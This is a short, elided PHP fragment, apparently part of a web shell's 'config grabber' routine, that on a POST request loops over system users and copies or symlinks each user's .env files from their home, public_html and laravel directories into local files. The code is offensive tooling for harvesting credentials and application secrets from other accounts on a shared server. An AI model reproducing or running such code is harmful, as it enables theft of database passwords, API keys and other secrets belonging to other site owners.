...
if (isset($_POST["conf"])) {
    ...
    foreach ($passwd as $pwd) {
        ...
        copy("/" . $home . "/" . $user . "/.env", $user . "  ENV");
        symlink("/" . $home . "/" . $user . "/.env", $user . "  ENV");
        copy("/" . $home . "/" . $user . "/public_html/.env", $user . "  ENV");
        symlink("/" . $home . "/" . $user . "/public_html/.env", $user . "  ENV");
        copy("/" . $home . "/" . $user . "/laravel/.env", $user . "  ENV");
